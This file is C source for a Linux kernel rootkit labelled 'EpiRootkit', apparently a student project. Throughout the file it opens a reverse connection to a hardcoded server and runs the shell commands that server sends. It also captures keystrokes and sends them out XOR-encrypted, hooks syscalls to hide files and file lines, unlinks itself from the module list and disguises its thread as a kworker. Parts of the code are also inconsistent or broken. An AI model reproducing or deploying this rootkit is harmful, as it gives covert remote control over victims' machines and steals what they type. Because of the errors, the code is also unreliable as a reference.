#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/socket.h>
#include <linux/sched.h>
#include <linux/kmod.h>
#include <linux/unistd.h>
#include <linux/errno.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/inetdevice.h> // pour in4_pton

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.1");

/* Configuration */
struct rootkit_config {
    int port;
    const char *server_ip;
    int buffer_size;
    const char *xor_key;
    const char *temp_output_file;
    const char *command_prefix_auth;
    const char *command_prefix_exec;
    const char *command_prefix_upload;
    const char *command_prefix_download;
    const char *command_prefix_keylog;
    int command_prefix_length;
    const char *shell_path;
    const char *shell_args;
    const char *path_env;
    const char *hidden_dir;
    int max_hidden_lines;
    const char *command_prefix_hide_line;
    const char *command_prefix_unhide_line;
};

static const struct rootkit_config config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 1024,
    .xor_key = "epirootkit",
    .temp_output_file = "/tmp/.rk_out",
    .command_prefix_auth = "auth ",
    .command_prefix_exec = "exec ",
    .command_prefix_upload = "upload ",
    .command_prefix_download = "download ",
    .command_prefix_keylog = "keylog ",
    .command_prefix_length = 5,
    .shell_path = "/bin/sh",
    .shell_args = "-c",
    .path_env = "PATH=/usr/bin:/bin",
    .hidden_dir = "/.rk_hidden",
    .max_hidden_lines = 100,
    .command_prefix_hide_line = "hide_line ",
    .command_prefix_unhide_line = "unhide_line "
};

/* Keylogger configuration */
struct keylog_config {
    int buffer_size;
    int send_interval;
};

static const struct keylog_config keylog_config = {
    .buffer_size = 1024,
    .send_interval = 5
};

/* Error handling */
struct error_info {
    int code;
    const char *message;
    const char *details;
};

static void handle_error(const struct error_info *error) {
    char error_msg[config.buffer_size];
    snprintf(error_msg, sizeof(error_msg), "ERROR: %s - %s", 
             error->message, error->details ? error->details : "");
    send_data(error_msg);
}

/* Memory management */
struct memory_manager {
    void *nonpaged_memory;
    size_t nonpaged_size;
    spinlock_t lock;
};

static struct memory_manager mem_manager = {
    .nonpaged_memory = NULL,
    .nonpaged_size = 4096,
    .lock = __SPIN_LOCK_UNLOCKED(mem_manager.lock)
};

static void *allocate_secure_memory(size_t size) {
    void *memory;
    unsigned long flags;
    
    spin_lock_irqsave(&mem_manager.lock, flags);
    memory = kmalloc(size, GFP_ATOMIC);
    if (memory) {
        SetPageReserved(virt_to_page(memory));
    }
    spin_unlock_irqrestore(&mem_manager.lock, flags);
    
    return memory;
}

static void free_secure_memory(void *memory) {
    unsigned long flags;
    
    if (!memory) return;
    
    spin_lock_irqsave(&mem_manager.lock, flags);
    ClearPageReserved(virt_to_page(memory));
    kfree(memory);
    spin_unlock_irqrestore(&mem_manager.lock, flags);
}

/* Command processing */
struct command_processor {
    bool is_authenticated;
    char password[256];
    struct list_head command_queue;
    spinlock_t lock;
};

static struct command_processor cmd_processor = {
    .is_authenticated = false,
    .password = "epita",
    .command_queue = LIST_HEAD_INIT(cmd_processor.command_queue),
    .lock = __SPIN_LOCK_UNLOCKED(cmd_processor.lock)
};

static bool process_command(const char *command) {
    unsigned long flags;
    bool success = false;
    
    spin_lock_irqsave(&cmd_processor.lock, flags);
    
    if (!cmd_processor.is_authenticated) {
        if (strncmp(command, config.command_prefix_auth, config.command_prefix_length) == 0) {
            cmd_processor.is_authenticated = 
                (strcmp(command + config.command_prefix_length, cmd_processor.password) == 0);
            success = cmd_processor.is_authenticated;
        }
    } else {
        if (strncmp(command, config.command_prefix_exec, config.command_prefix_length) == 0) {
            exec_and_send_output(command + config.command_prefix_length);
            success = true;
        }
    }
    
    spin_unlock_irqrestore(&cmd_processor.lock, flags);
    return success;
}

/* Network communication */
struct network_manager {
    struct socket *connection;
    struct task_struct *thread;
    bool is_connected;
    spinlock_t lock;
};

static struct network_manager net_manager = {
    .connection = NULL,
    .thread = NULL,
    .is_connected = false,
    .lock = __SPIN_LOCK_UNLOCKED(net_manager.lock)
};

static int establish_connection(void) {
    struct sockaddr_in server_addr;
    int ret;
    unsigned long flags;
    
    spin_lock_irqsave(&net_manager.lock, flags);
    
    if (net_manager.is_connected) {
        spin_unlock_irqrestore(&net_manager.lock, flags);
        return 0;
    }
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &net_manager.connection);
    if (ret < 0) {
        spin_unlock_irqrestore(&net_manager.lock, flags);
        return ret;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config.port);
    in4_pton(config.server_ip, -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);
    
    ret = kernel_connect(net_manager.connection, (struct sockaddr *)&server_addr, 
                        sizeof(server_addr), 0);
    if (ret < 0) {
        sock_release(net_manager.connection);
        net_manager.connection = NULL;
    } else {
        net_manager.is_connected = true;
        g_connection_socket = net_manager.connection; // note a moi meme: Pour eviter le pointeur null et corriger le crash systeme
    }
    
    spin_unlock_irqrestore(&net_manager.lock, flags);
    return ret;
}

/* Keylogger structures */
struct keylog_entry {
    char key;
    unsigned long timestamp;
};

struct keylog_buffer {
    struct keylog_entry *entries;
    unsigned int head;
    unsigned int tail;
    spinlock_t lock;
};

/* Global state */
static struct socket *g_connection_socket = NULL;
static struct task_struct *g_rootkit_thread = NULL;
static struct task_struct *g_keylog_thread = NULL;
static bool g_is_authenticated = false;
static char g_password[256] = "epita"; // TODO: Ne pas hardcoder le mot de passe
static struct list_head *g_prev_module = NULL;
static struct keylog_buffer *g_keylog_buffer = NULL;
static bool g_keylog_enabled = false;

/* Original syscall pointers */
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_read)(const struct pt_regs *);
static asmlinkage long (*original_write)(const struct pt_regs *);

/* Structure pour stocker les lignes masquées */
struct hidden_line {
    char *filename;
    unsigned long line_number;
    struct list_head list;
};

/* Liste des lignes masquées */
static LIST_HEAD(hidden_lines);
static DEFINE_SPINLOCK(hidden_lines_lock);

/* Définition des codes d'erreur */
#define ROOTKIT_ERROR_NONE 0
#define ROOTKIT_ERROR_CONNECTION -1
#define ROOTKIT_ERROR_AUTHENTICATION -2
#define ROOTKIT_ERROR_COMMAND -3
#define ROOTKIT_ERROR_FILE -4
#define ROOTKIT_ERROR_MEMORY -5
#define ROOTKIT_ERROR_PERMISSION -6

/* Structure pour les messages d'erreur */
struct error_message {
    int code;
    const char *message;
};

/* Table des messages d'erreur */
static const struct error_message error_messages[] = {
    {ROOTKIT_ERROR_NONE, "Success"},
    {ROOTKIT_ERROR_CONNECTION, "Connection failed"},
    {ROOTKIT_ERROR_AUTHENTICATION, "Authentication failed"},
    {ROOTKIT_ERROR_COMMAND, "Invalid command"},
    {ROOTKIT_ERROR_FILE, "File operation failed"},
    {ROOTKIT_ERROR_MEMORY, "Memory allocation failed"},
    {ROOTKIT_ERROR_PERMISSION, "Permission denied"},
    {-1, NULL}
};

/* Fonction pour obtenir le message d'erreur */
static const char *get_error_message(int error_code) {
    const struct error_message *err = error_messages;
    while (err->message != NULL) {
        if (err->code == error_code)
            return err->message;
        err++;
    }
    return "Unknown error";
}

/* Fonction pour envoyer un message d'erreur */
static void send_error(int error_code, const char *details) {
    char error_msg[config.buffer_size];
    snprintf(error_msg, sizeof(error_msg), "ERROR: %s - %s", get_error_message(error_code), details ? details : "");
    send_data(error_msg);
}

/* Forward declarations */
static int rootkit_thread(void *data);
static int keylog_thread(void *data);
static int connect_to_server(void);
static void exec_and_send_output(const char *cmd);
static int send_data(const char *msg);
static void hide_module(void);
static void unhide_module(void);
static asmlinkage long hook_getdents64(const struct pt_regs *regs);
static asmlinkage long hook_read(const struct pt_regs *regs);
static asmlinkage long hook_write(const struct pt_regs *regs);
static void keylog_buffer_init(void);
static void keylog_buffer_cleanup(void);
static void keylog_add_entry(char key);
static void keylog_send_buffer(void);
static void hide_line(const char *filename, unsigned long line_number);
static void unhide_line(const char *filename, unsigned long line_number);
static bool is_line_hidden(const char *filename, unsigned long line_number);

/* Nouvelles constantes de configuration */
#define ROOTKIT_CONFIG_NONPAGED_MEMORY_SIZE 4096
#define ROOTKIT_CONFIG_STEALTH_INTERVAL 30  /* secondes */
#define ROOTKIT_CONFIG_MAX_HOOKS 10
#define ROOTKIT_CONFIG_DKOM_ENABLED 1

/* Structure pour le DKOM (Direct Kernel Object Manipulation) */
struct dkom_entry {
    void *object;
    void *original_data;
    size_t size;
    struct list_head list;
};

/* Structure pour les hooks */
struct hook_entry {
    void *target;
    void *hook;
    void *original;
    struct list_head list;
};

/* Variables globales supplémentaires */
static LIST_HEAD(dkom_entries);
static LIST_HEAD(hook_entries);
static DEFINE_SPINLOCK(dkom_lock);
static DEFINE_SPINLOCK(hook_lock);
static struct task_struct *g_stealth_thread = NULL;

/* Thread de furtivité */
static int stealth_thread(void *data) {
    struct hook_entry *entry;
    unsigned long flags;
    while (!kthread_should_stop()) {
        // Masquer les traces dans /proc
        hide_module();
        // Nettoyer les logs
        if (g_keylog_enabled) {
            keylog_send_buffer();
        }
        // Vérifier et restaurer les hooks si nécessaire
        spin_lock_irqsave(&hook_lock, flags);
        list_for_each_entry(entry, &hook_entries, list) {
            if (*((void **)entry->target) != entry->hook) {
                *((void **)entry->target) = entry->hook;
            }
        }
        spin_unlock_irqrestore(&hook_lock, flags);
        msleep(ROOTKIT_CONFIG_STEALTH_INTERVAL * 1000);
    }
    return 0;
}

/**
 * @brief Applies XOR cipher to a buffer using the configured key
 * @param buffer Buffer to encrypt/decrypt
 * @param length Length of the buffer
 */
static void apply_xor_cipher(char *buffer, int length) {
    const size_t key_length = strlen(config.xor_key);
    int i;
    for (i = 0; i < length; i++) {
        buffer[i] ^= config.xor_key[i % key_length];
    }
}

/**
 * @brief Sends encrypted data to the server
 * @param message Message to send
 * @return Number of bytes sent or negative error code
 */
static int send_data(const char *message) {
    struct kvec iov;
    struct msghdr msg_header = { .msg_flags = MSG_NOSIGNAL };
    int message_length = strlen(message);
    char *encrypted_message;

    encrypted_message = kmalloc(message_length, GFP_KERNEL);
    if (!encrypted_message)
        return -ENOMEM;

    memcpy(encrypted_message, message, message_length);
    apply_xor_cipher(encrypted_message, message_length);

    iov.iov_base = encrypted_message;
    iov.iov_len = message_length;

    int result = kernel_sendmsg(g_connection_socket, &msg_header, &iov, 1, message_length);
    kfree(encrypted_message);
    return result;
}

/**
 * @brief Executes a command and sends its output to the server
 * @param command Command to execute
 */
static void exec_and_send_output(const char *command) {
    struct file *output_file;
    mm_segment_t old_fs;
    char *output_buffer;
    int read_result;
    char full_command[256];
    char *argv[4];
    char *envp[2];
    int exec_result;

    if (!command || strlen(command) == 0) {
        send_error(ROOTKIT_ERROR_COMMAND, "Empty command");
        return;
    }

    /* Prepare command string */
    snprintf(full_command, sizeof(full_command), "sh -c '%s' 2>&1", command);

    /* Prepare argv/envp dynamically (C90 compliant) */
    argv[0] = (char *)config.shell_path;
    argv[1] = (char *)config.shell_args;
    argv[2] = full_command;
    argv[3] = NULL;
    envp[0] = (char *)config.path_env;
    envp[1] = NULL;

    /* Execute command and capture output */
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    output_file = filp_open(config.temp_output_file, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (IS_ERR(output_file)) {
        set_fs(old_fs);
        send_error(ROOTKIT_ERROR_FILE, "Failed to create output file");
        return;
    }

    exec_result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    filp_close(output_file, NULL);
    set_fs(old_fs);

    if (exec_result != 0) {
        send_error(ROOTKIT_ERROR_COMMAND, "Command execution failed");
        return;
    }

    /* Read command output */
    output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
    if (IS_ERR(output_file)) {
        send_error(ROOTKIT_ERROR_FILE, "Failed to open output file");
        return;
    }

    output_buffer = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!output_buffer) {
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_MEMORY, "Failed to allocate output buffer");
        return;
    }

    memset(output_buffer, 0, config.buffer_size);
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    /* Correction de l'appel kernel_read : signature moderne */
    loff_t pos = 0;
    read_result = kernel_read(output_file, pos, output_buffer, config.buffer_size - 1);
    set_fs(old_fs);

    if (read_result < 0) {
        kfree(output_buffer);
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_FILE, "Failed to read output file");
        return;
    }

    if (read_result > 0) {
        output_buffer[read_result] = '\0';
        send_data(output_buffer);
    } else {
        send_data("Command executed with no output.\n");
    }

    filp_close(output_file, NULL);
    kfree(output_buffer);
}

/**
 * @brief Hooks the getdents64 syscall to hide files
 */
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct linux_dirent64 *current_dir, *dirent_ker = NULL;

    if (ret <= 0)
        return ret;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (dirent_ker == NULL)
        return ret;

    if (copy_from_user(dirent_ker, dirent, ret))
        goto done;

    for (off = 0; off < ret;) {
        dir = (void *)dirent_ker + off;
        if (strstr(dir->d_name, config.hidden_dir)) {
            if (dir == dirent_ker) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        off += dir->d_reclen;
    }

    if (copy_to_user(dirent, dirent_ker, ret))
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

/**
 * @brief Hooks the read syscall to hide module from /proc/modules
 */
static asmlinkage long hook_read(const struct pt_regs *regs) {
    struct file *file = (struct file *)regs->di;
    char __user *buf = (char *)regs->si;
    size_t count = (size_t)regs->dx;
    loff_t *pos = (loff_t *)regs->r10;
    char *kernel_buf;
    unsigned long line_number = 1;
    bool skip_line = false;
    int ret;

    /* Appel original si ce n'est pas un fichier */
    if (!file || !file->f_path.dentry)
        return original_read(regs);

    /* Vérifier si le fichier est dans la liste des fichiers surveillés */
    spin_lock(&hidden_lines_lock);
    if (!list_empty(&hidden_lines)) {
        struct hidden_line *line;
        list_for_each_entry(line, &hidden_lines, list) {
            if (strcmp(line->filename, file->f_path.dentry->d_name.name) == 0) {
                skip_line = true;
                break;
            }
        }
    }
    spin_unlock(&hidden_lines_lock);

    if (!skip_line)
        return original_read(regs);

    /* Allouer un buffer kernel */
    kernel_buf = kmalloc(count, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    /* Lire le fichier */
    ret = original_read(regs);
    if (ret < 0) {
        kfree(kernel_buf);
        return ret;
    }

    /* Copier les données dans le buffer kernel */
    if (copy_from_user(kernel_buf, buf, ret)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    /* Traiter les lignes */
    char *line_start = kernel_buf;
    char *line_end;
    size_t new_size = 0;
    char *new_buf = kmalloc(count, GFP_KERNEL);

    if (!new_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    while ((line_end = strchr(line_start, '\n')) != NULL) {
        if (!is_line_hidden(file->f_path.dentry->d_name.name, line_number)) {
            size_t line_len = line_end - line_start + 1;
            memcpy(new_buf + new_size, line_start, line_len);
            new_size += line_len;
        }
        line_start = line_end + 1;
        line_number++;
    }

    /* Copier le reste du fichier */
    if (line_start < kernel_buf + ret) {
        size_t remaining = kernel_buf + ret - line_start;
        memcpy(new_buf + new_size, line_start, remaining);
        new_size += remaining;
    }

    /* Copier le résultat dans le buffer utilisateur */
    if (copy_to_user(buf, new_buf, new_size)) {
        kfree(kernel_buf);
        kfree(new_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(new_buf);
    return new_size;
}

/**
 * @brief Hook for write syscall to capture keyboard input
 */
static asmlinkage long hook_write(const struct pt_regs *regs) {
    struct file *file = (struct file *)regs->di;
    const char __user *buf = (const char __user *)regs->si;
    size_t count = (size_t)regs->dx;
    char *kbuf;
    long ret;

    if (!file || !buf || count == 0)
        return original_write(regs);

    /* Check if this is a keyboard device */
    if (file->f_inode && S_ISCHR(file->f_inode->i_mode)) {
        kbuf = kmalloc(count, GFP_KERNEL);
        if (!kbuf)
            return original_write(regs);

        if (copy_from_user(kbuf, buf, count)) {
            kfree(kbuf);
            return original_write(regs);
        }

        size_t i;
        for (i = 0; i < count; i++) {
            if (isprint(kbuf[i])) {
                keylog_add_entry(kbuf[i]);
            }
        }

        kfree(kbuf);
    }

    return original_write(regs);
}

/**
 * @brief Hides the module from lsmod
 */
static void hide_module(void) {
    struct module *mod = THIS_MODULE;
    list_del(&mod->list);
    g_prev_module = mod->list.prev;
}

/**
 * @brief Unhides the module
 */
static void unhide_module(void) {
    struct module *mod = THIS_MODULE;
    list_add(&mod->list, g_prev_module);
}

/**
 * @brief Initializes the keylogger buffer
 */
static void keylog_buffer_init(void) {
    g_keylog_buffer = kmalloc(sizeof(struct keylog_buffer), GFP_KERNEL);
    if (!g_keylog_buffer)
        return;
    memset(g_keylog_buffer, 0, sizeof(struct keylog_buffer));
    g_keylog_buffer->entries = kmalloc_array(keylog_config.buffer_size, sizeof(struct keylog_entry), GFP_KERNEL);
    if (!g_keylog_buffer->entries) {
        kfree(g_keylog_buffer);
        g_keylog_buffer = NULL;
        return;
    }
    spin_lock_init(&g_keylog_buffer->lock);
}

/**
 * @brief Cleans up the keylogger buffer
 */
static void keylog_buffer_cleanup(void) {
    if (g_keylog_buffer) {
        if (g_keylog_buffer->entries)
            kfree(g_keylog_buffer->entries);
        kfree(g_keylog_buffer);
        g_keylog_buffer = NULL;
    }
}

/**
 * @brief Adds a key entry to the buffer
 * @param key The key to add
 */
static void keylog_add_entry(char key) {
    unsigned long flags;
    unsigned int next_head;

    if (!g_keylog_buffer || !g_keylog_enabled)
        return;

    spin_lock_irqsave(&g_keylog_buffer->lock, flags);

    next_head = (g_keylog_buffer->head + 1) % keylog_config.buffer_size;
    if (next_head != g_keylog_buffer->tail) {
        g_keylog_buffer->entries[g_keylog_buffer->head].key = key;
        g_keylog_buffer->entries[g_keylog_buffer->head].timestamp = jiffies;
        g_keylog_buffer->head = next_head;
    }

    spin_unlock_irqrestore(&g_keylog_buffer->lock, flags);
}

/**
 * @brief Sends the keylogger buffer to the server
 */
static void keylog_send_buffer(void) {
    unsigned long flags;
    char *buffer;
    int len = 0;
    unsigned int pos;

    if (!g_keylog_buffer || !g_connection_socket)
        return;

    buffer = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!buffer)
        return;

    spin_lock_irqsave(&g_keylog_buffer->lock, flags);

    pos = g_keylog_buffer->tail;
    while (pos != g_keylog_buffer->head) {
        if (len + 32 >= config.buffer_size) {
            break;
        }
        len += snprintf(buffer + len, config.buffer_size - len,
                       "[%lu] %c\n", g_keylog_buffer->entries[pos].timestamp,
                       g_keylog_buffer->entries[pos].key);
        pos = (pos + 1) % keylog_config.buffer_size;
    }
    g_keylog_buffer->tail = pos;

    spin_unlock_irqrestore(&g_keylog_buffer->lock, flags);

    if (len > 0) {
        send_data(buffer);
    }

    kfree(buffer);
}

/**
 * @brief Keylogger thread function
 * @param data Thread parameter (unused)
 * @return Thread return value (never reached)
 */
static int keylog_thread(void *data) {
    while (!kthread_should_stop()) {
        if (g_keylog_enabled && g_connection_socket) {
            keylog_send_buffer();
        }
        ssleep(keylog_config.send_interval);
    }
    return 0;
}

/**
 * @brief Fonction pour masquer une ligne
 */
static void hide_line(const char *filename, unsigned long line_number) {
    struct hidden_line *new_line;
    unsigned long flags;

    new_line = kmalloc(sizeof(struct hidden_line), GFP_KERNEL);
    if (!new_line)
        return;

    new_line->filename = kstrdup(filename, GFP_KERNEL);
    if (!new_line->filename) {
        kfree(new_line);
        return;
    }

    new_line->line_number = line_number;

    spin_lock_irqsave(&hidden_lines_lock, flags);
    list_add(&new_line->list, &hidden_lines);
    spin_unlock_irqrestore(&hidden_lines_lock, flags);
}

/**
 * @brief Fonction pour démasquer une ligne
 */
static void unhide_line(const char *filename, unsigned long line_number) {
    struct hidden_line *line, *tmp;
    unsigned long flags;

    spin_lock_irqsave(&hidden_lines_lock, flags);
    list_for_each_entry_safe(line, tmp, &hidden_lines, list) {
        if (strcmp(line->filename, filename) == 0 && line->line_number == line_number) {
            list_del(&line->list);
            kfree(line->filename);
            kfree(line);
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_lines_lock, flags);
}

/**
 * @brief Fonction pour vérifier si une ligne est masquée
 */
static bool is_line_hidden(const char *filename, unsigned long line_number) {
    struct hidden_line *line;
    bool hidden = false;
    unsigned long flags;

    spin_lock_irqsave(&hidden_lines_lock, flags);
    list_for_each_entry(line, &hidden_lines, list) {
        if (strcmp(line->filename, filename) == 0 && line->line_number == line_number) {
            hidden = true;
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_lines_lock, flags);
    return hidden;
}

/**
 * @brief Module initialization function
 */
static int __init epirootkit_init(void) {
    int ret;
    
    // Initialize memory manager
    mem_manager.nonpaged_memory = allocate_secure_memory(mem_manager.nonpaged_size);
    if (!mem_manager.nonpaged_memory) {
        return -ENOMEM;
    }
    
    // Initialize network
    ret = establish_connection();
    if (ret < 0) {
        free_secure_memory(mem_manager.nonpaged_memory);
        return ret;
    }
    
    // Start threads
    net_manager.thread = kthread_run(rootkit_thread, NULL, "kworker_cache");
    if (IS_ERR(net_manager.thread)) {
        free_secure_memory(mem_manager.nonpaged_memory);
        return PTR_ERR(net_manager.thread);
    }
    
    // Initialize keylogger
    keylog_buffer_init();
    g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
    if (IS_ERR(g_keylog_thread)) {
        g_keylog_thread = NULL;
    }
    
    // Start stealth thread
    g_stealth_thread = kthread_run(stealth_thread, NULL, "kworker/%d", 0);
    if (IS_ERR(g_stealth_thread)) {
        free_secure_memory(mem_manager.nonpaged_memory);
        return PTR_ERR(g_stealth_thread);
    }
    
    return 0;
}

/**
 * @brief Module cleanup function
 */
static void __exit epirootkit_exit(void) {
    // Stop threads
    if (net_manager.thread)
        kthread_stop(net_manager.thread);
    if (g_keylog_thread)
        kthread_stop(g_keylog_thread);
    if (g_stealth_thread)
        kthread_stop(g_stealth_thread);
    
    // Cleanup network
    if (net_manager.connection) {
        sock_release(net_manager.connection);
        net_manager.connection = NULL;
    }
    
    // Restore syscalls
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_read] = (unsigned long)original_read;
    sys_call_table[__NR_write] = (unsigned long)original_write;
    
    // Unhide module
    unhide_module();
    
    // Cleanup keylogger
    keylog_buffer_cleanup();
    
    // Free secure memory
    if (mem_manager.nonpaged_memory) {
        free_secure_memory(mem_manager.nonpaged_memory);
    }
    
    // --- Suppression des boucles DKOM/hooks qui crashent ---
    // struct dkom_entry *entry, *tmp;
    // unsigned long flags;
    // spin_lock_irqsave(&dkom_lock, flags);
    // list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
    //     dkom_restore_object(entry->object);
    // }
    // spin_unlock_irqrestore(&dkom_lock, flags);
    // struct hook_entry *hook_entry, *hook_tmp;
    // spin_lock_irqsave(&hook_lock, flags);
    // list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
    //     remove_hook(hook_entry->target);
    // }
    // spin_unlock_irqrestore(&hook_lock, flags);
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);

// Fallback pour isprint si <linux/ctype.h> indisponible
#ifndef isprint
#define isprint(c) ((c) >= 0x20 && (c) <= 0x7e)
#endif

// Fallback pour in4_pton si indisponible
#ifndef HAVE_IN4_PTON
static int in4_pton(const char *src, int srclen, u8 *dst, int delim, const char **end)
{
    unsigned int val;
    int i, j, k;
    char c;
    for (i = 0, j = 0; i < 4; i++) {
        val = 0;
        k = 0;
        while (srclen && (c = *src) && c >= '0' && c <= '9') {
            val = val * 10 + (c - '0');
            src++; srclen--; k = 1;
        }
        if (!k || val > 255)
            return 0;
        dst[j++] = val;
        if (i < 3) {
            if (!srclen || *src != '.')
                return 0;
            src++; srclen--;
        }
    }
    if (end)
        *end = src;
    return 1;
}
#endif